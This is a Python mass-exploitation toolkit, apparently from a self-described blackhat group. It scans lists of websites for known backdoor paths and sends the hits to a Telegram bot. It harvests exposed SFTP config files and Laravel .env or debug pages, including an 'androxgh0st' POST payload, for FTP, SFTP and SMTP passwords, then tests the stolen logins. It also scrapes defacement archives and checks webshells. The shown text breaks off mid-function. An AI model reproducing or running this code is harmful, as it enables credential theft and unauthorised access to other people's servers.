from colorama import Fore
from colorama import Fore, Back, init, Style
from colorama import Fore, Style, Back
from colorama import Fore, Style, init
from colorama import Fore, init
from urllib.parse import urlparse
from colorama import Style
from colorama import init
from colorama import init, Fore
from configparser import ConfigParser
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from multiprocessing.dummy import Pool
from multiprocessing.dummy import Pool as ThreadPool
from platform import system
from queue import Queue
from re import findall as reg
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from termcolor import colored
from threading import *
from threading import Thread
from concurrent.futures import ThreadPoolExecutor
import colorama
import concurrent.futures
import getpass
import json
import multiprocessing
import os
import os.path
import platform
import random
import re
import requests
import signal
import smtplib
import socket
import sys
import threading
import time
import urllib.request
import urllib3
import warnings

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

r = Fore.YELLOW + Style.BRIGHT
g = Fore.GREEN + Style.BRIGHT
c = Fore.CYAN + Style.BRIGHT
y = Fore.YELLOW + Style.BRIGHT
o = Fore.RESET + Style.RESET_ALL

bl = Fore.BLUE
wh = Fore.WHITE
gr = Fore.GREEN
red = Fore.RED
res = Style.RESET_ALL
yl = Fore.YELLOW
blc = Fore.BLACK

bg_gr = Back.GREEN
bg_red = Back.RED
bg_wh = Back.WHITE

warnings.filterwarnings('ignore', message='Unverified HTTPS request')

init(autoreset=True)

def send_telegram_message(chat_id, bot_token, message):
    try:
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        params = {
            'chat_id': chat_id,
            'text': message,
        }
        response = requests.get(url, params=params)
        return response.json()
    except Exception as e:
        print(f"Error sending message to Telegram: {e}")
        return {'ok': False}

def read_backdoors():
    try:
        with open('exploit-cs.json', 'r') as backdoor_file:
            backdoor_data = json.load(backdoor_file)
        return backdoor_data.get("backdoors", [])
    except FileNotFoundError:
        print('Backdoor configuration file not found.')
        sys.exit(1)
    except Exception as backdoor_err:
        print('Error reading backdoor configuration:', backdoor_err)
        sys.exit(1)

def read_zone_h_config():
    try:
        with open('config.json', 'r') as config_file:
            config_data = json.load(config_file)
            zhe_value = config_data["zone-h_config"]["zhe"]
            phpsid_value = config_data["zone-h_config"]["phpsessid"]
        return zhe_value, phpsid_value
    except Exception as config_err:
        print('Error reading Zone-H configuration:', config_err)
        sys.exit(1)

def read_config():
    try:
        with open('config.json', 'r') as config_file:
            config_data = json.load(config_file)
        return config_data
    except Exception as config_err:
        print('Error reading configuration:', config_err)
        sys.exit(1)

def exploit(url, chat_id, bot_token, backdoors):
    try:
        head = {'User-agent': 'Mozilla/5.0 (Linux; Android 11; M2010J19SI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36'}

        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url

        for backdoor in backdoors:
            req = requests.get(url + backdoor['path'], headers=head, timeout=15).text
            if backdoor['expected_string'] in req:
                vuln_url = url + backdoor['path'] + '#' + backdoor['vuln_name']
                print(colored(f'[Vuln]: {vuln_url}', 'green'))

                # Send result to Telegram
                vuln_message = f'[Vuln]: {vuln_url}'
                response = send_telegram_message(chat_id, bot_token, vuln_message)
                if response['ok']:
                    print(colored('Shell Message Telegram Successfully', 'cyan'))
                else:
                    print(colored('Shell Message Telegram Failed', 'red'))

                open('expl0it-shell.txt', 'a').write(vuln_url + '\n')
            else:
                print(colored(f"[Not Vuln]: {url}", 'red'))

    except requests.exceptions.Timeout:
        print(colored(f"[Error Timeout]: {url}", 'blue'))

    except Exception:
        domain = url.split('//')[-1].split('/')[0]
        print(colored(f"[Error]: {domain}", 'blue'))

def pr():
    try:
        list_file = input(' List : ')
        config_data = read_config()
        chat_id = config_data["shell-f_config"]["chatid"]
        bot_token = config_data["shell-f_config"]["tokenbot"]

        backdoors = read_backdoors()

        try:
            with open(list_file, 'r') as url_file:
                url_list = url_file.read().splitlines()
                thread_count = min(len(url_list), 150)
                pool = Pool(thread_count)
                pool.starmap(exploit, [(url, chat_id, bot_token, backdoors) for url in url_list])
        except Exception as file_err:
            print('Error reading URL list:', file_err)
    except KeyboardInterrupt:
        print('Process interrupted.')
    except Exception as main_err:
        print('An unexpected error occurred:', main_err)
    finally:
        main_menu()

def remove_duplicate_lines(input_file, output_file):
    try:
        total_lines = sum(1 for _ in open(input_file, 'r', encoding='utf-8'))
        with open(input_file, 'r', encoding='utf-8') as result:
            uniqlines = set(result.readlines())
            with open(output_file, 'w', encoding='utf-8') as kontol:
                processed_lines = 0
                for line in uniqlines:
                    kontol.write(line)
                    processed_lines += 1
                    progress = processed_lines / total_lines
                    print_progress_bar(progress)
        print(f'\nDuplicates removed and saved to {output_file}')
    except FileNotFoundError:
        print('Input file not found')

def print_progress_bar(progress):
    bar_length = 40
    block = int(round(bar_length * progress))
    progress_percent = progress * 100
    bar = '\033[32m' + '=' * block + '\033[0m' + '-' * (bar_length - block)
    sys.stdout.write(f'\r[{bar}] {progress_percent:.1f}%')
    sys.stdout.flush()

def clean_web():
    try:
        list_file = input('List: ')
        output_file = list_file.replace('.txt', '_clean.txt')
        remove_duplicate_lines(list_file, output_file)
    except KeyboardInterrupt:
        print('\nOperation aborted')
    except Exception as e:
        print('\nAn error occurred:', str(e))
    finally:
        main_menu()    

#zone-hhhh

zhe_value, phpsid_value = read_zone_h_config()

cookie = {
    "ZHE": zhe_value,
    "PHPSESSID": phpsid_value
}


fr = Fore.RED
fh = Fore.RED
fc = Fore.CYAN
fo = Fore.MAGENTA
fw = Fore.WHITE
fy = Fore.YELLOW
fbl = Fore.BLUE
fg = Fore.GREEN
sd = Style.DIM
fb = Fore.RESET
sn = Style.NORMAL
sb = Style.BRIGHT

user = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"}

url = "http://www.zone-h.org/archive/notifier="
urll = "http://zone-h.org/archive/published=0"
url2 = "http://www.defacers.org/onhold!"
url4 = "http://www.defacers.org/gold!"


def zonehh():
    print("""
        |---| Grabb Sites From Zone-h |--|
        \033[91m[1] \033[95mGrabb Sites By Notifier
        \033[91m[2] \033[95mGrabb Sites By Onhold
        """)
    sec = int(input("Choose Section : "))

    zhe_value, phpsid_value = read_zone_h_config()

    cookie = {
        "ZHE": zhe_value,
        "PHPSESSID": phpsid_value
    }

    if sec == 1:
        notf = input("\033[95mEnter notifier: \033[92m")

        for i in range(1, 51):
            url = f"http://www.zone-h.org/archive/notifier={notf}/page={i}"
            print(f"Trying URL: {url}")

            dz = requests.get(url, cookies=cookie)
            
            if dz.status_code != 200:
                print(f"Error: Status Code {dz.status_code}")
                continue

            dzz = dz.content
            print(f"Content: {dzz[:200]}")  # Print first 200 characters of content for debugging

            if b'<html><body>-<script type="text/javascript"' in dzz:
                print("Onii Chan Please Enter Cookie")
                sys.exit()
            elif b'<input type="text" name="captcha" value=""><input type="submit">' in dzz:
                print("Onii Chan Please Change Captcha In Zone-H")
                sys.exit()
            else:
                Hunt_urls = re.findall(b'<td>(.*)\n\s+<\/td>', dzz)
                if b'/mirror/id/' in dzz:
                    for xx in Hunt_urls:
                        qqq = xx.replace(b'...', b'')
                        print('    [' + '*' + '] ' + qqq.split(b'/')[0].decode())
                        with open(notf + '.txt', 'a') as rr:
                            rr.write("http://" + qqq.split(b'/')[0].decode() + '\n')
                else:
                    print("Grabb Sites Completed Arigatou Onii Chan ^_^")
                    sys.exit()

    elif sec == 2:
        print(":* __Grabb Sites By Onhold__ ^_^")
        for qwd in range(1, 51):
            url = f"http://zone-h.org/archive/published=0/page={qwd}"
            print(f"Trying URL: {url}")

            rb = requests.get(url, cookies=cookie)

            if rb.status_code != 200:
                print(f"Error: Status Code {rb.status_code}")
                continue

            dzq = rb.content
            print(f"Content: {dzq[:200]}")  # Print first 200 characters of content for debugging

            if b'<html><body>-<script type="text/javascript"' in dzq:
                print("Onii Chan Please Change Captcha In Zone-H")
                sys.exit()

            elif b"captcha" in dzq:
                print("Onii Chan Please Change Captcha In Zone-H")
            else:
                Hunt_urlss = re.findall(b'<td>(.*)\n\s+<\/td>', dzq)
                for xxx in Hunt_urlss:
                    qqqq = xxx.replace(b'...', b'')
                    print('    [' + '*' + '] ' + qqqq.split(b'/')[0].decode())
                    with open('onhold_zone.txt', 'a') as rrr:
                        rrr.write("http://" + qqqq.split(b'/')[0].decode() + '\n')
    else:
        print("Invalid option")


def clearscrn():
    if system() == 'Linux':
        os.system('clear')
    if system() == 'Windows':
        os.system('cls')
        os.system('color a')


clearscrn()


def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(4. / 100)


def helper4():
    clearscrn()
    banner = """\033[33m\033[91m\033[93m

    ==========================================================
    =======================Chatlotte==========================
    =Author : NetPhantom    Telegram : @maybe_syndicate =
    =Team   : Syndicate    Telegram Channel : t.me/syndicatestore_blackhat =
    ==========================================================
"""
    print("""\033[91m

    ==========================================================
    =======================Chatlotte==========================
    =Author : NetPhantom    Telegram : @maybe_syndicate =
    =Team   : Syndicate    Telegram Channel : t.me/syndicatestore_blackhat =
    ==========================================================
    
    [+]1. Zone-H Grabber
            """)
    try:
        qq = int(input("\033[91m[-] \033[90mroot@user~#\033[95m : \033[90m"))
        if qq == 1:
            clearscrn()
            print(banner)
            zonehh()

    except:
        pass

        input("\nPress Enter to return to the main menu...")
        main_menu()


#zone-hhh-endddd 

#ftp

headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0'}

def screen_clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def ftp(star, config_file):
    if "://" not in star:
        star = "http://" + star
    star = star.replace('\n', '').replace('\r', '')
    url = star + config_file
    try:
        check = requests.get(url, headers=headers, timeout=10)
        if check.status_code == 200:
            resp = check.text
            if "save_before_upload" in resp or "uploadOnSave" in resp:
                print(f"{bg_gr}{blc} Exploited {res} => {star}{Style.RESET_ALL}\n")
                with open("sftp-exploited.txt", "a") as f:
                    f.write(f'{url}\n')
            else:
                print(f"{bg_red}{blc} Failed {res} => {star}{Style.RESET_ALL}\n")
    except requests.exceptions.RequestException as e:
        domain = star.split("//")[-1].split("/")[0]
        print(f"{bg_wh}{blc} NULL {res} => {domain}{Style.RESET_ALL}\n")


def filter(star):
    ftp(star, "/sftp-config.json")
    ftp(star, "/.vscode/sftp.json")
def ftp_hunter_menu():
    while True:
        screen_clear()
        print(f'{wh}SFTP HUNTER')
        list_file = input(f"{wh}List?:")
        try:
            with open(list_file, 'r') as f:
                star = f.readlines()
            break
        except FileNotFoundError:
            print(f"{wh}ERROR: File not found! Please provide a valid list.{res}\n")
            input("Press Enter to continue...")

    try:
        with ThreadPool(100) as pool:
            pool.map(filter, star)
    except Exception as e:
        print("Error:", e)

    input("\nPress Enter to return to the main menu...")
    main_menu()

#laravel-hunter


#laravel-hunter-end
#ftp-sub-menu

def ftp_sub_menu():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""\033[96m
[1] Split Sftps
[2] Checker Sftp
[0] Back to Main Menu\033[96m
""")
    choice = input("Select number :P : ")

    if choice == "1":
        split_sftp()
    elif choice == "2":
        check_sftp()
    elif choice == "0":
        main_menu()
    else:
        print("Invalid choice. Please select a valid option.")
        ftp_sub_menu()

#ftp-end-menu


#ftp-split#
def split_sftp():
    while True:
        filename = "sftp-exploited.txt"
        if not os.path.exists(filename):
            print("Cannot find 'sftp-exploited.txt' file.")
            input("Press Enter to continue...")
            return  # Balik sa submenu

        with open(filename, "r") as f:
            lines = f.readlines()

        counter = 0
        total = len(lines)

        for line in lines:
            counter += 1
            url = line.strip()

            num_retries = 0

            while True:
                try:
                    response = requests.get(url)
                    text = response.text

                    host_pattern = r'"host"\s*:\s*"([^"]*)"'
                    host_pattern_alt = r'"host":\s+"([^"]+)"'
                    username_pattern = r'"username"\s*:\s*"([^"]*)"'
                    username_pattern_alt = r'"user":\s+"([^"]+)"'
                    password_pattern = r'"password"\s*:\s*"([^"]*)"'
                    password_pattern_alt = r'"password":\s+"([^"]+)"'
                    port_pattern = r'"port"\s*:\s*(\d+)'
                    port_pattern2 = r'"port":\s+"([^"]+)"'

                    host_match = re.search(host_pattern, text) or re.search(host_pattern_alt, text)
                    username_match = re.search(username_pattern, text) or re.search(username_pattern_alt, text)
                    password_match = re.search(password_pattern, text) or re.search(password_pattern_alt, text)
                    port_match = re.search(port_pattern, text)
                    if not port_match:
                        port_match = re.search(port_pattern2, text)
                        if not port_match:
                            port = 21
                        else:
                            port = port_match.group(1)
                    else:
                        port = port_match.group(1)

                    if host_match and username_match and password_match:
                        host = host_match.group(1)
                        username = username_match.group(1)
                        password = password_match.group(1)

                        with open("sftp-filtered.txt", "a") as f:
                            f.write("{}|{}|{}|{}|{}\n".format(url, host, port, username, password))

                        print("Processing connection {} out {}".format(counter, total))
                        break

                    else:
                        print("Tidak dapat menemukan nilai 'host', 'username', atau 'password'. Lanjutkan ke URL berikutnya.")
                        break

                except requests.exceptions.RequestException:
                    num_retries += 1
                    print("Koneksi {} dari {} gagal. Lewati koneksi ini.".format(counter, total))
                    break

        print("Processing completed. The results are saved in sftp-filtered.txt.")
        input("Press Enter to continue...")
        ftp_sub_menu 
#ftp-split-end

#ftp-check
def check_sftp():
    def check_ftp_connection(domain, host, port, username, password):
        try:
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=3)
            ftp.login(username, password)
            ftp.quit()
            return True
        except Exception as e:
            return False

    def check_sftp_connection(domain, host, port, username, password):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, port, username, password, timeout=3)
            ssh.close()
            return True
        except Exception as e:
            return False

    def check_connection(line, line_number):
        fields = line.strip().split("|")
        if len(fields) == 5:
            domain, host, port, username, password = fields
            port = int(port)

            if port == 21:
                result = check_ftp_connection(domain, host, port, username, password)
            else:
                result = check_sftp_connection(domain, host, port, username, password)

            if result:
                with open("log.txt", "a") as f:
                    f.write("domain: {}\n".format(domain))
                    f.write("host: {}\n".format(host))
                    f.write("port: {}\n".format(port))
                    f.write("username: {}\n".format(username))
                    f.write("password: {}\n".format(password))
                    f.write("\n")
        else:
            print("Invalid line format (line {}): {}".format(line_number, line))

    filename = input("sftp file : ")

    if not os.path.exists(filename):
        print("File {} tidak ditemukan.".format(filename))
        input("Press Enter to continue...")
        ftp_sub_menu()

    with open(filename, "r") as f:
        lines = f.readlines()

    pool = Pool()

    pool.starmap(check_connection, [(line, i+1) for i, line in enumerate(lines)])

    pool.close()
    pool.join()

    print("Processing completed.")
    input("Press Enter to continue...")
    ftp_sub_menu()

#ftp-check-end

def printf(text, background_color=None, text_color=None):
    text = ''.join([str(item) for item in text])
    background_color_code = ""
    text_color_code = ""
    reset_code = colorama.Fore.RESET + colorama.Back.RESET

    if background_color:
        if background_color == "red":
            background_color_code = colorama.Back.RED
        elif background_color == "green":
            background_color_code = colorama.Back.GREEN
        elif background_color == "yellow":
            background_color_code = colorama.Back.YELLOW

    if text_color:
        if text_color == "white":
            text_color_code = colorama.Fore.WHITE
        elif text_color == "green":
            text_color_code = colorama.Fore.GREEN
        elif text_color == "red":
            text_color_code = colorama.Fore.RED
        elif text_color == "ocean blue":
            text_color_code = "\x1b[38;5;39m"

    print(background_color_code + text_color_code + text + reset_code)

#smtp-checker
def smtp_exploit():
    def get_smtp_random(text, url):
        try:
            if "MAIL_HOST" in text:
                if "MAIL_HOST=" in text:
                    method = "/.env"
                    try:
                        mailhost = reg('\nMAIL_HOST=(.*?)\n', text)
                    except:
                        mailhost = ""
                    try:
                        mailport = reg('\nMAIL_PORT=(.*?)\n', text)
                    except:
                        mailport = ""
                    try:
                        mailuser = reg('\nMAIL_USERNAME=(.*?)\n', text)
                    except:
                        mailuser = ""
                    try:
                        mailpass = reg('\nMAIL_PASSWORD=(.*?)\n', text)
                    except:
                        mailpass = ""
                    try:
                        mailfrom = reg('\nMAIL_FROM_ADDRESS=(.*?)\n', text)
                    except:
                        mailfrom = ""
                    try:
                        fromname = reg('\\MAIL_FROM_NAME=(.*?)\n', text)
                    except:
                        fromname = ""
                elif "<td>MAIL_HOST</td>" in text:
                    method = 'debug'
                    mailhost = reg('<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailport = reg('<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailuser = reg('<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailpass = reg('<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    try:
                        mailfrom = reg("<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("<td>MAIL_FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        fromname = ''
                if mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "":
                    return False
                else:
                    build = 'URL: '+str(url)+'\nMETHOD: '+str(method)   +'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)   +'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
                    remover = str(build).replace('\r', '')
                    save = open('Results'+os.sep+'SMTP_RANDOM.txt', 'a')
                    save.write(remover+'\n\n')
                    save.close()
                    return True
        except:
            return False

    def main(url):
        try:
            text = '[Connect To List] ' + url
            headers = {"User-Agent": 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
            get_source = requests.get(url+"/.env", headers=headers, timeout=5, verify=False, allow_redirects=False)
            if "APP_KEY=" in get_source.text:
                resp = get_source.text
            else:
                get_source = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
                if "<td>APP_KEY</td>" in get_source:
                    resp = get_source
                    if resp:
                        getsmtp = get_smtp_random(resp, url)
                        if getsmtp:
                            text += ' [Status] SMTP'
                            printf(text, background_color="green", text_color="white")
                        else:
                            text += ' [Status] SMTP'
                            printf(text, background_color="red", text_color="white")
                    else:
                        text = ' [Status] Fail To Crack'
                        printf(text, background_color="red", text_color="white")
        except requests.exceptions.RequestException as e:
            text = '[Connect To List] ' + url + ' [Status] Error: Connection Failed'
            printf(text, background_color="red", text_color="white")
            return
        except SSLError:
            text = '[Connect To List] ' + url + ' [Status] Error: Connection Failed'
            printf(text, background_color="red", text_color="white")
            return
        except NameResolutionError:
            text = '[Connect To List] ' + url + ' [Status] Error: Connection Failed'
            printf(text, background_color="red", text_color="white")
            return
        except Exception as e:
            text = '[Connect To List] ' + url + ' [Status] Unknown Error'
            printf(text, background_color="red", text_color="white")
            print("Error:", e)
            return

    try:
        readcfg = ConfigParser()
        readcfg.read(pid_restore)
        lists = readcfg.get("DB", "FILES")
        numthread = readcfg.get("DB", "THREAD")
        sessi = readcfg.get("DB", "SESSION")
        printf("log session bot found! restore session", background_color="yellow", text_color="white")
        printf("Using Configuration : \n\tFILES="+lists+"\n\tTHREAD="+numthread+"\n\tSESSION="+sessi, background_color="yellow", text_color="white")
        tanya = input(' Continue Exploit ? [y/n] ')
        if tanya.lower() == "y":
            lerr = open(lists).read().split("\n"+sessi)[1]
            readsplit = lerr.splitlines()
        else:
            kntl
    except:
        try:
            lists = sys.argv[1]
            numthread = sys.argv[2]
            readsplit = open(lists).read().splitlines()
        except FileNotFoundError:
            printf("List Not Found", background_color="red", text_color="white")
            exit()
        except Exception:
            lists = input('List IPs/Domain --> ')
            try:
                readsplit = open(lists).read().splitlines()
            except:
                printf("List Not Found", background_color="red", text_color="white")
                exit()
        try:
            numthread = input('Thread (Default : 200) --> ')
        except Exception:
            printf("Error Threads", background_color="red", text_color="white")
            exit()
    with ThreadPoolExecutor(max_workers=150) as executor:
        for url in readsplit:
            if "://" in url:
                url = url
            else:
                url = "http://"+url
            if url.endswith('/'):
                url = url[:-1]
            jagases = url
            try:
                executor.submit(main, url)
            except KeyboardInterrupt:
                session = open(pid_restore, "w")
                cfgsession = '[DB]\nFILES='+lists+'\nTHREAD='+str(numthread)+"\nSESSION="+jagases+"\n"
                session.write(cfgsession)
                session.close()
                printf("CTRL+C Detect, Session saved", background_color="yellow", text_color="white")
                exit()

def filter_and_create_allsmtp():
    # Read SMTP_RANDOM.txt
    with open('Results/SMTP_RANDOM.txt', 'r') as smtp_file:
        smtp_data = smtp_file.read()

    # Find all SMTP entries
    smtp_entries = reg(r'URL: (.*?)\nMETHOD: (.*?)\nMAILHOST: (.*?)\nMAILPORT: (.*?)\nMAILUSER: (.*?)\nMAILPASS: (.*?)\nMAILFROM: (.*?)\nFROMNAME: (.*?)\n\n', smtp_data)

    # Write to allsmtp.txt
    with open('Results/allsmtp.txt', 'w') as allsmtp_file:
        for entry in smtp_entries:
            url, method, mailhost, mailport, mailuser, mailpass, mailfrom, fromname = entry
            allsmtp_file.write(f"{mailhost}|{mailport}|{mailuser}|{mailpass}\n")
            
    printf('Task Done', background_color="green", text_color="white")
#smtp-checker-end

#reverseip
def askdns(ip):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36'
        }
        response = requests.get(f'https://askdns.com/ip/{ip}', headers=headers, timeout=30)
        if response.status_code == 200:
            content = response.text
            if 'Domain Name' in content:
                domains = re.findall('<a href="/domain/(.*?)">', content)
                with open('revip.txt', 'a') as f:
                    for domain in domains:
                        print(f"GET {len(domain)} DOMAIN FROM {ip}")
                        f.write('http://' + domain + '\n')
            else:
                print(f"BAD RAP {ip}")
        else:
            print(f"Request to askdns.com for {ip} failed with status code {response.status_code}")
    except Exception as e:
        print(f"Error in askdns for {ip}: {e}")

def rapid(ip):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36'
        }
        response = requests.get(f'https://rapiddns.io/s/{ip}?full=1&down=1#result', headers=headers, timeout=30)
        if response.status_code == 200:
            content = response.text
            if '<th scope="row ">' in content:
                domains = re.findall('<td>(?!\-)(?:[a-zA-Z\d\-]{0,62}[a-zA-Z\d]\.){1,126}(?!\d+)[a-zA-Z]{1,63}</td>', content)
                with open('revip.txt', 'a') as f:
                    for domain in domains:
                        cok = domain.replace('<td>', '').replace('</td>', '').replace('ftp.', '').replace('images.', '').replace(
                            'cpanel.', '').replace('cpcalendars.', '').replace('cpcontacts.', '').replace('webmail.', '').replace(
                            'webdisk.', '').replace('hostmaster.', '').replace('mail.', '').replace('ns1.', '').replace('ns2.',
                                                                                                                       '').replace(
                            'autodiscover.', '')
                        print(f"GET {len(cok)} DOMAIN FROM {ip}")
                        f.write('http://' + cok + '\n')
            else:
                print(f"BAD RAP {ip}")
        else:
            print(f"Request to rapiddns.io for {ip} failed with status code {response.status_code}")
    except Exception as e:
        print(f"Error in rapid for {ip}: {e}")

def webscan(ip):
    try:
        url = f"https://api.webscan.cc/?action=query&ip={ip}"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            content = response.text
            domains = re.findall('"domain": "(.*?)",', content)[3:]
            with open('revip.txt', 'a') as file:
                for domain in domains:
                    domain = domain.lower()
                    if 'result' not in domain and 'total' not in domain:
                        if not domain.startswith('webmail.') and not domain.startswith('ftp.') and not domain.startswith('cpanel.') and not domain.startswith('webdisk.') and not domain.startswith('cpcalendars.') and not domain.startswith('cpcontacts.') and not domain.startswith('ns1.') and not domain.startswith('ns2.'):
                            domain = domain.replace('www.', '').replace('Domains', '')
                            print(f"GET {len(domain)} DOMAIN FROM {ip}")
                            file.write(domain + '\n')
        else:
            print(f"Request to webscan.cc for {ip} failed with status code {response.status_code}")
    except Exception as e:
        print(f"Error in webscan for {ip}: {e}")

def revip(ip):
    try:
        rapid(ip)
        askdns(ip)
        webscan(ip)
    except Exception as e:
        print(f"Error in revip for {ip}: {e}")

def reverse_ip_menu():
    try:
        list_path = input("UR LIST :~# ")  # For Python 3
        url = open(list_path, 'r', encoding='utf-8').read().splitlines()
        THREAD = input("THREAD :~# ")  # For Python 3
        pp = ThreadPool(int(THREAD))
        pr = pp.map(revip, url)
    except Exception as e:
        print("Error in reverse_ip_menu:", e)
#reverseip-end

#grab-by-date
def grab_domains_by_date():
    print("Website Grabber by Date [Best For WP-Bruteforce]\n")
    print("Example Usage:")
    print("Year: 2024")
    print("Month: 01")
    print("Date: 01")
    print("Number of dates to collect: 30")
    print("\nNote: Wait for result until all successful attempt")

    year = int(input("Enter year: "))
    month = int(input("Enter month: "))
    day = int(input("Enter day: "))
    num_dates = int(input("Number of dates to collect: "))

    def fetch_website_list(year, month, day, result_list):
        date = f"{year}-{month:02d}-{day:02d}"
        url = f"http://files.xz.com/{date}.txt"
        try:
            response = requests.get(url)
            response.raise_for_status()
            website_list = response.text.splitlines()
            for site in website_list:
                result_list.append(site)
            print(f"Successfully collected website list for {date}")
        except requests.RequestException as e:
            print(f"Failed to collect website list for {date}. Error: {e}")

    threads = []
    result_lists = []

    for i in range(num_dates):
        result_list = []
        thread = threading.Thread(target=fetch_website_list, args=(year, month, day + i, result_list))
        threads.append(thread)
        result_lists.append(result_list)
        thread.start()

    for thread in threads:
        thread.join()

    for result_list in result_lists:
        with open(f"Date_Grabbed/grabbed_{year}-{month:02d}-{day:02d}.txt", 'w') as file:
            for site in result_list:
                file.write(f"{site}\n")

    print("Website lists collected successfully and saved date-wise!")
    input("Press Enter to return to the main menu...")
    main_menu()
#grab-by-date-end

#range-ip
def range_ips():
    print("\033[96m\nRange IP\n")  # Cyan color
    file_name = input("Enter the file name containing the list of IPs: ")
    ips = []
    try:
        with open(file_name, 'r') as file:
            for line in file:
                ip = line.strip()
                for i in range(0, 255):
                    ip_range = '{0}.{1}.{2}.{3}'.format(*ip.split('.'), str(i))
                    print("\033[92m" + ip_range)  # Green color
                    ips.append(ip_range)
                    # Save IP range to file immediately
                    with open('ips_ranged.txt', 'a') as f:
                        f.write(ip_range + '\n')
        print("\033[96m\nSuccessfully created 'ips_ranged.txt' with IP ranges.")
    except Exception as e:
        print("Error:", e)
    input("Task Completed. Press Enter to return to the main menu...")
    main_menu()  # Automatically return to the main menu

#range-ip-end

#domain-to-ip
def domain_to_ip():
    print("\033[96m\nDomain To IP\n")  # Cyan color
    domain_list_file = input("Enter list Domains: ")
    try:
        with open(domain_list_file) as f:
            domains = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("\033[91mFile not found:", domain_list_file)  # Red color
        return
    thread_count = int(input("Recommended Threads 300\nEnter number of threads: "))
    try:
        with open('ips.txt', 'a') as ips_file:  # Open in append mode
            with ThreadPoolExecutor(max_workers=thread_count) as executor:
                futures = []
                for domain in domains:
                    futures.append(executor.submit(convert_domain_to_ip, domain, ips_file))
                    print("\033[96mProcessing domain:", domain)
                for future in futures:
                    future.result()  # Wait for the task to complete
    except Exception as e:
        print("\033[91mError:", e)  # Red color
    print("\033[96mTask Completed. Returning to the main menu...")  # Cyan color
    main_menu()  # Return to main menu

def convert_domain_to_ip(domain, ips_file):
    try:
        if domain.startswith('http://'):
            domain = domain.replace('http://', '')
        elif domain.startswith('https://'):
            domain = domain.replace('https://', '')
        if 'www.' in domain:
            domain = domain.replace('www.', '')
        domain = domain.rstrip('/')
        ip = socket.gethostbyname(domain)
        print("\033[92m" + f"{domain} -> {ip}")  # Green color
        ips_file.write(ip + '\n')  # Write IP to ips.txt
        ips_file.flush()  # Flush the buffer to ensure immediate write
    except Exception as e:
        print("\033[91mError:", e)  # Red color
#domain-to-ip-end

#webshell-check

def webshell_checker():
    file_name = input("Enter the file name: ")

    with open(file_name, 'r', errors='ignore') as f:
        lines = f.readlines()

    for line in lines:
        line = line.strip()
        try:
            response = requests.get(line, verify=False, timeout=10)  # Set timeout to 10 seconds
            if response.status_code == 200:
                print(f"[{'#'}] {line} > {'200'}")
                with open("work.txt", "a") as f:
                    f.write(line + "\n")
            else:
                print(f"[{'#'}] {line} > {'ERROR'}")
        except requests.exceptions.Timeout:
            print(f"[{'#'}] {line} > {'Timeout'}")
        except requests.exceptions.RequestException as e:
            print(f"[{'#'}] {line} > {'Error: ' + str(e)}")

    input("Press Enter to return to the main menu...")
    main_menu()

#webshell-check-end

#lexicographically
def sort_lines_lexicographically(file_name):
    CHUNK_SIZE = 100000  # Adjust the chunk size as needed

    try:
        with open(file_name, 'r', errors='ignore') as f:
            output_file = "lexicographically-list.txt"
            with open(output_file, 'w') as out_file:
                lines = []
                for line in f:
                    lines.append(line)
                    if len(lines) >= CHUNK_SIZE:
                        sorted_lines = sorted(lines)
                        out_file.writelines(sorted_lines)
                        lines = []
                if lines:
                    sorted_lines = sorted(lines)
                    out_file.writelines(sorted_lines)
            print("Sorted lines have been saved to lexicographically-list.txt")
    except FileNotFoundError:
        print("Error: File not found.")
    except Exception as e:
        print("Error:", e)
    main_menu()    
#lexicographically-end

#add-http-https
def add_http_https(file_name):
    CHUNK_SIZE = 100000  # Adjust the chunk size as needed

    try:
        http_output_file = "http.txt"
        https_output_file = "https.txt"
        
        with open(file_name, 'r', errors='ignore') as f:
            http_domains = []
            https_domains = []
            for line in f:
                domain = line.strip()
                if not domain.startswith(("http://", "https://")):
                    if not domain.startswith("www."):
                        domain = "www." + domain
                    http_domains.append("http://" + domain)
                    https_domains.append("https://" + domain)
                elif domain.startswith("http://"):
